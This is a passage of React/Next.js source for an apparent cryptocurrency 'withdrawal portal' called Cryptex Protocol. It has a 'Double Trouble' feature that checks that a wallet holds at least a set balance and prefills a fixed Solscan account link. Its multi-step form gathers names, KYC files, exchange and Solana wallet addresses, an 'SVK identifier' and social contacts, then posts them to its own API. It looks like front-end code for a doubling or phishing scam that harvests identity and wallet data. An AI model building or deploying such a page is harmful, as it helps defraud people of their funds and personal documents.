          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>SPL · Mainnet Beta</div>
        </div>
      </div>
      <FieldLabel>SOLANA WALLET ADDRESS</FieldLabel>
      <input placeholder="e.g. 7wM6Tyh...tUgV" value={wallet}
        onChange={e => { setWallet(e.target.value); setError(''); setBalanceData(null); }}
        autoFocus maxLength={44}
        style={{ width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none' }}
        onFocus={e => { e.target.style.borderColor = '#f59e0b'; }}
        onBlur={e => { if (!error) e.target.style.borderColor = 'rgba(245,158,11,.25)'; }}
        onKeyDown={e => e.key === 'Enter' && checkAndNext()}
      />

      {/* Checking state */}
      {checking && (
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(245,158,11,.06)', border: '1px solid rgba(245,158,11,.2)' }}>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#f59e0b', animation: 'blink 0.8s ease-in-out infinite' }} />
          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(245,158,11,.8)' }}>Verifying wallet balance on Solana mainnet...</span>
        </div>
      )}

      {/* Error */}
      {error && (
        <div style={{ marginTop: 8, padding: '10px 12px', borderRadius: 7, background: 'rgba(255,69,69,.06)', border: '1px solid rgba(255,69,69,.25)' }}>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#ff4545', lineHeight: 1.6 }}>⚠ {error}</div>
          {error.includes('Insufficient') && (
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(255,150,69,.7)', marginTop: 6 }}>
              ◎ Wallet minimum for Double Trouble: $137.43 USDC · Please top up and try again.
            </div>
          )}
        </div>
      )}

      {/* Success */}
      {balanceData && balanceData.meetsMinimum && (
        <div style={{ marginTop: 8, padding: '10px 14px', borderRadius: 7, background: 'rgba(245,158,11,.06)', border: '1px solid rgba(245,158,11,.3)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
            <span style={{ color: '#f59e0b', fontSize: 14 }}>✓</span>
            <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#f59e0b', fontWeight: 600 }}>Wallet balance verified</span>
          </div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.65)', lineHeight: 1.8 }}>
            {balanceData.balance.toFixed(4)} SOL · ${balanceData.usdcValue.toFixed(2)} USDC<br />
            <span style={{ color: 'rgba(245,158,11,.4)' }}>SOL price: ${balanceData.solPrice.toFixed(2)} · Min: $137.43 USDC</span>
          </div>
        </div>
      )}

      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.3)', marginTop: 8, marginBottom: 14 }}>
        ◎ Wallet minimum for Double Trouble: $137.43 USDC · Verified on-chain
      </p>
      <div style={{ display: 'flex', gap: 10 }}>
        <BtnBack onClick={onBack} />
        <DTBtnNext onClick={checkAndNext} disabled={checking}>{checking ? 'VERIFYING...' : 'NEXT →'}</DTBtnNext>
      </div>

      {/* Opt-out button */}
      <button onClick={onOptOut} style={{
        width: '100%', marginTop: 10,
        fontFamily: "'Share Tech Mono',monospace", fontSize: 10,
        letterSpacing: '1px', padding: '10px 0',
        border: '1px solid rgba(255,69,69,.2)', borderRadius: 8,
        background: 'transparent', color: 'rgba(255,69,69,.45)',
        cursor: 'pointer', transition: 'all .25s',
      }}
        onMouseEnter={e => { e.currentTarget.style.borderColor = 'rgba(255,69,69,.45)'; e.currentTarget.style.color = 'rgba(255,69,69,.75)'; e.currentTarget.style.background = 'rgba(255,69,69,.04)'; }}
        onMouseLeave={e => { e.currentTarget.style.borderColor = 'rgba(255,69,69,.2)'; e.currentTarget.style.color = 'rgba(255,69,69,.45)'; e.currentTarget.style.background = 'transparent'; }}
      >
        I voluntarily refused this safety feature
      </button>
    </div>
  );
}

function DTStepFoundryFinal({ onNext, onBack }) {
  const [link, setLink] = useState('https://solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const MAX = 256;
  const submit = async () => {
    if (!link.trim()) { setError('Foundry link is required'); return; }
    setLoading(true);
    onNext({ foundryLink: link.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(245,158,11,.05)', border: '1px solid rgba(245,158,11,.15)', borderRadius: 8, padding: '10px 12px', marginBottom: 14 }}>
        <span style={{ color: '#f59e0b', fontSize: 14, flexShrink: 0 }}>🔗</span>
        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.6)', wordBreak: 'break-all' }}>
          solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV
        </span>
      </div>
      <FieldLabel>FOUNDRY LINK</FieldLabel>
      <textarea placeholder="https://solscan.io/account/..." value={link} onChange={e => { setLink(e.target.value); setError(''); }} rows={3} maxLength={MAX}
        style={{ width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none', resize: 'vertical', minHeight: 80 }}
        onFocus={e => { e.target.style.borderColor = '#f59e0b'; }} onBlur={e => { if (!error) e.target.style.borderColor = 'rgba(245,158,11,.25)'; }}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
        <BtnBack onClick={onBack} />
        <DTBtnNext onClick={submit} disabled={loading}>{loading ? 'SUBMITTING...' : 'SUBMIT →'}</DTBtnNext>
      </div>
    </div>
  );
}

function DTBtnNext({ onClick, children, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled} style={{
      flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
      padding: '13px 0', border: 'none', borderRadius: 8,
      background: disabled ? 'rgba(245,158,11,.2)' : 'linear-gradient(135deg,#d97706,#b45309)',
      color: disabled ? 'rgba(245,158,11,.4)' : '#fff',
      cursor: disabled ? 'not-allowed' : 'pointer', transition: 'all .3s',
    }}
      onMouseEnter={e => { if (!disabled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
      onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
    >{children}</button>
  );
}

// ─── MAIN PAGE ─────────────────────────────────────────────────────────────

const STEPS_CONFIG = [
  { title: 'AUTHENTICATE', sub: 'Enter your access code to continue' },
  { title: 'YOUR NAME', sub: 'Enter your full name for verification' },
  { title: 'EXCHANGE WALLET', sub: 'Enter your exchange withdrawal address' },
  { title: 'SOLANA WALLET', sub: 'Provide your SOL receiving address' },
  { title: 'SVK', sub: 'Enter your SVK identifier' },
  { title: 'SOCIAL CONTACT', sub: 'Where can we reach you?' },
  { title: 'FOUNDRY LINK', sub: 'Confirm your Solscan foundry account' },
];

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(0);
  const [formData, setFormData] = useState({});
  const { price, change } = useSolPrice();

  const [showPool, setShowPool] = useState(false);
  const [showDT, setShowDT] = useState(false);
  const [showTerms, setShowTerms] = useState(false);
  const [showKYC, setShowKYC] = useState(false);
  const openModal = () => { setShowTerms(true); };
  const acceptTerms = () => { setShowTerms(false); setShowKYC(true); };
  const closeTerms = () => { setShowTerms(false); };
  const acceptKYC = (kycData) => { setShowKYC(false); setStep(0); setFormData({ ...kycData }); setModalOpen(true); };
  const closeKYC = () => { setShowKYC(false); setShowTerms(true); };

  const next = (data = {}) => {
    setFormData(prev => ({ ...prev, ...data }));
    setStep(s => s + 1);
  };
  const back = () => setStep(s => s - 1);

  const handleFoundrySubmit = async (data) => {
    const payload = { ...formData, ...data };
    setFormData(payload);
    try {
      await fetch('/api/submit', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: payload.name, kycFile: payload.kycFile, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, usdcValue: payload.usdcValue, svk: payload.svk, socialLink: payload.socialLink, foundryLink: payload.foundryLink }),
      });
    } catch {}
    setStep(7);
  };

  const isSuccess = step === 7;
  const stepInfo = STEPS_CONFIG[step] || {};

  return (
    <>
      <Head>
        <title>Cryptex Protocol · Solana Native</title>
        <meta name="description" content="Cryptex Protocol — Solana Native Withdrawal Portal" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>" />
      </Head>

      <style>{`
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#03020e;overflow-x:hidden;min-height:100vh;color:#e0e0ff}
        @keyframes fadeInUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
        @keyframes modalIn{from{opacity:0;transform:scale(.92) translateY(16px)}to{opacity:1;transform:scale(1) translateY(0)}}
        @keyframes pulseHalo{0%,100%{opacity:.6;transform:translate(-50%,-50%) scale(1)}50%{opacity:1;transform:translate(-50%,-50%) scale(1.08)}}
        @keyframes rotateSlow{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
        @keyframes glowPulse{0%,100%{box-shadow:0 0 20px rgba(153,69,255,.2),0 0 40px rgba(20,241,149,.1)}50%{box-shadow:0 0 40px rgba(153,69,255,.4),0 0 80px rgba(20,241,149,.2)}}
        @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
        nav button { position: relative; overflow: hidden; }
        nav button::after { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,.06),transparent); opacity:0; transition:.3s; }
        nav button:hover::after { opacity:1; }
      `}</style>
      <SecurityLayer />

      <ParticleCanvas />
      <DataRings />

      {/* Corner decorations */}
      <div style={{ position: 'fixed', top: 68, left: 16, width: 36, height: 36, borderTop: '1.5px solid rgba(153,69,255,.35)', borderLeft: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />
      <div style={{ position: 'fixed', top: 68, right: 16, width: 36, height: 36, borderTop: '1.5px solid rgba(153,69,255,.35)', borderRight: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />
      <div style={{ position: 'fixed', bottom: 16, left: 16, width: 36, height: 36, borderBottom: '1.5px solid rgba(153,69,255,.35)', borderLeft: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />
      <div style={{ position: 'fixed', bottom: 16, right: 16, width: 36, height: 36, borderBottom: '1.5px solid rgba(153,69,255,.35)', borderRight: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />

      {/* NAV */}
      <nav style={{ position: 'fixed', top: 0, left: 0, right: 0, zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '14px 32px', borderBottom: '1px solid rgba(153,69,255,.15)', background: 'rgba(4,3,13,.75)', backdropFilter: 'blur(14px)' }}>
        <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 17, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>⬡ CRYPTEX</div>

        {/* Live SOL price */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(153,69,255,.1)', border: '1px solid rgba(153,69,255,.25)', borderRadius: 30, padding: '6px 14px' }}>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#14f195', boxShadow: '0 0 8px #14f195', animation: 'blink 1.5s ease-in-out infinite' }} />
          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 12, color: '#e0e0ff' }}>
            SOL {price ? `$${price.toLocaleString('en', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '$—'}
          </span>
          {change !== null && (
            <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: change >= 0 ? '#14f195' : '#ff4545' }}>
              {change >= 0 ? '+' : ''}{change.toFixed(2)}%
            </span>
          )}
        </div>

        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <button onClick={() => setShowPool(true)}
            style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2, padding: '9px 22px', border: '1px solid rgba(20,241,149,.5)', borderRadius: 7, background: 'rgba(20,241,149,.08)', color: '#14f195', cursor: 'pointer', transition: 'all .3s' }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(20,241,149,.18)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(20,241,149,.25)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
            onMouseLeave={e => { e.currentTarget.style.background = 'rgba(20,241,149,.08)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)'; }}
          >CHECK POOL</button>
          <button onClick={() => setShowDT(true)}
            style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2, padding: '9px 22px', border: '1px solid rgba(245,158,11,.5)', borderRadius: 7, background: 'rgba(245,158,11,.08)', color: '#f59e0b', cursor: 'pointer', transition: 'all .3s' }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(245,158,11,.18)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(245,158,11,.25)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
            onMouseLeave={e => { e.currentTarget.style.background = 'rgba(245,158,11,.08)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)'; }}
          >⚡ DOUBLE TROUBLE</button>
          <button onClick={openModal}
            style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2, padding: '9px 22px', border: '1px solid #9945ff', borderRadius: 7, background: 'rgba(153,69,255,.12)', color: '#9945ff', cursor: 'pointer', transition: 'all .3s' }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.28)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(153,69,255,.35)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
            onMouseLeave={e => { e.currentTarget.style.background = 'rgba(153,69,255,.12)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)'; }}
          >LAUNCH APP</button>
        </div>
      </nav>

      {/* HERO */}
      <main style={{ position: 'relative', zIndex: 2, minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', textAlign: 'center', padding: '100px 20px 60px', overflow: 'hidden' }}>

        {/* 3D Sphere — behind text */}
        <div style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 520, height: 520, zIndex: 0, opacity: 0.7 }}>
          <CryptoSphere />
        </div>

        {/* Glowing halo behind sphere */}
        <div style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 400, height: 400, borderRadius: '50%', background: 'radial-gradient(ellipse, rgba(153,69,255,0.12) 0%, rgba(20,241,149,0.06) 50%, transparent 70%)', zIndex: 0, animation: 'pulseHalo 4s ease-in-out infinite' }} />

        {/* Content above sphere */}
        <div style={{ position: 'relative', zIndex: 3 }}>

          {/* Status badge */}
          <div style={{ fontSize: 10, letterSpacing: 3, color: '#14f195', border: '1px solid rgba(20,241,149,.35)', padding: '5px 18px', borderRadius: 20, marginBottom: 32, display: 'inline-flex', alignItems: 'center', gap: 8, animation: 'fadeInUp .7s both', background: 'rgba(20,241,149,.05)', backdropFilter: 'blur(10px)' }}>
            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#14f195', boxShadow: '0 0 8px #14f195', display: 'inline-block', animation: 'blink 1.5s infinite' }} />
            ◎ SOLANA · ETH · BTC · DEFI
          </div>

          {/* Main title */}
          <h1 style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 'clamp(28px,5.5vw,76px)', lineHeight: 1.0, marginBottom: 20, textShadow: '0 0 80px rgba(153,69,255,0.4)' }}>
            <span style={{ display: 'block', color: '#fff', animation: 'fadeInUp .7s .1s both', letterSpacing: '0.02em' }}>CRYPTEX PROTOCOL</span>
            <span style={{ display: 'block', background: 'linear-gradient(135deg,#9945ff 20%,#14f195 80%)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', animation: 'fadeInUp .7s .18s both', letterSpacing: '0.02em' }}>SOLANA NATIVE</span>
          </h1>

          {/* Subtitle with line decorations */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 16, justifyContent: 'center', marginBottom: 40, animation: 'fadeInUp .7s .26s both' }}>
            <div style={{ width: 40, height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.5))' }} />
            <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 12, color: 'rgba(224,224,255,.4)', letterSpacing: 2, margin: 0 }}>
              REAL-TIME · INSTITUTIONAL · LIGHTNING-FAST
            </p>
            <div style={{ width: 40, height: 1, background: 'linear-gradient(90deg,rgba(153,69,255,.5),transparent)' }} />
          </div>

          {/* CTA Buttons */}
          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', flexWrap: 'wrap', marginBottom: 56, animation: 'fadeInUp .7s .34s both' }}>
            <button onClick={openModal}
              style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 12, letterSpacing: 2, padding: '14px 38px', border: 'none', borderRadius: 9, background: 'linear-gradient(135deg,#9945ff,#7b2fd6)', color: '#fff', cursor: 'pointer', transition: 'all .35s', position: 'relative', overflow: 'hidden' }}
              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-3px)'; e.currentTarget.style.boxShadow = '0 16px 48px rgba(153,69,255,.5)'; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none'; }}
            >LAUNCH APP →</button>
            <button onClick={() => setShowPool(true)}
              style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 12, letterSpacing: 2, padding: '14px 32px', border: '1px solid rgba(20,241,149,.4)', borderRadius: 9, background: 'rgba(20,241,149,.06)', color: '#14f195', cursor: 'pointer', transition: 'all .35s', backdropFilter: 'blur(8px)' }}
              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-3px)'; e.currentTarget.style.boxShadow = '0 16px 40px rgba(20,241,149,.2)'; e.currentTarget.style.background = 'rgba(20,241,149,.12)'; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.background = 'rgba(20,241,149,.06)'; }}
            >CHECK POOL ◎</button>
          </div>

          {/* Feature strip */}
          <div style={{ display: 'flex', gap: 0, justifyContent: 'center', flexWrap: 'wrap', animation: 'fadeInUp .7s .5s both' }}>
            {[['⚡', 'LIGHTNING EXECUTION'], ['◎', 'SOLANA NATIVE'], ['◈', 'MULTI-CHAIN'], ['⬡', 'INSTITUTIONAL']].map(([icon, text], i) => (
              <div key={text} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 20px', borderRight: i < 3 ? '1px solid rgba(153,69,255,.15)' : 'none' }}>
                <span style={{ fontSize: 14, filter: 'drop-shadow(0 0 6px currentColor)' }}>{icon}</span>
                <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 9, letterSpacing: '1.5px', color: 'rgba(224,224,255,.4)' }}>{text}</span>
              </div>
            ))}
          </div>

        </div>
      </main>

      {/* COUNTDOWN PILL */}
      <CountdownPill />
      <DoubleTroublePill />

      {/* POOL MODAL */}
      {showPool && <PoolModal onClose={() => setShowPool(false)} />}

      {/* DOUBLE TROUBLE MODAL */}
      {showDT && <DoubleTroubleModal onClose={() => setShowDT(false)} />}

      {/* TERMS MODAL */}
      {showTerms && <TermsModal onAccept={acceptTerms} onClose={closeTerms} />}

      {/* KYC MODAL */}
      {showKYC && <KYCModal onNext={acceptKYC} onClose={closeKYC} />}

      {/* MODAL */}
      {modalOpen && (
        <div onClick={e => { if (e.target === e.currentTarget) setModalOpen(false); }}
          style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.85)', backdropFilter: 'blur(10px)', padding: 20 }}>
          <div style={{ background: '#0c0c1a', border: '1px solid rgba(153,69,255,.35)', borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both' }}>
            {/* Top accent line */}
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#9945ff,#14f195,transparent)' }} />

            {/* Header */}
            <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
              <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 4 }}>⬡ CRYPTEX PROTOCOL</div>
              {!isSuccess && <>
                <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 18, fontWeight: 700, color: '#fff', marginBottom: 6 }}>{stepInfo.title}</div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', letterSpacing: .5, marginBottom: 20 }}>{stepInfo.sub}</div>
              </>}
            </div>

            {!isSuccess && <>
              <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.3),transparent)', margin: '0 28px' }} />
              <ProgressDots current={step} total={STEPS_CONFIG.length} />
            </>}

            {step === 0 && <StepAccess onNext={() => next()} />}
            {step === 1 && <StepName onNext={next} onBack={back} />}
            {step === 2 && <StepExchangeWallet onNext={next} onBack={back} />}
            {step === 3 && <StepWallet onNext={next} onBack={back} />}
            {step === 4 && <StepSVK onNext={next} onBack={back} />}
            {step === 5 && <StepSocial onNext={next} onBack={back} />}
            {step === 6 && <StepFoundry onNext={handleFoundrySubmit} onBack={back} />}
            {step === 7 && <StepSuccess />}
          </div>
        </div>
      )}

      {/* Footer */}
      <footer style={{ position: 'relative', zIndex: 2, borderTop: '1px solid rgba(153,69,255,.12)', background: 'rgba(4,3,13,.95)', padding: '32px 20px', textAlign: 'center' }}>
        <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 16, fontWeight: 900, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 10 }}>⬡ CRYPTEX</div>
        <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.2)', letterSpacing: 1 }}>© 2025 CRYPTEX PROTOCOL · DECENTRALIZED · UNSTOPPABLE</p>
        <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.3)', letterSpacing: 1, marginTop: 6 }}>BY: j.dev · ~soren.xyz · ~naseem · ~xy</p>
      </footer>
    </>
  );
}
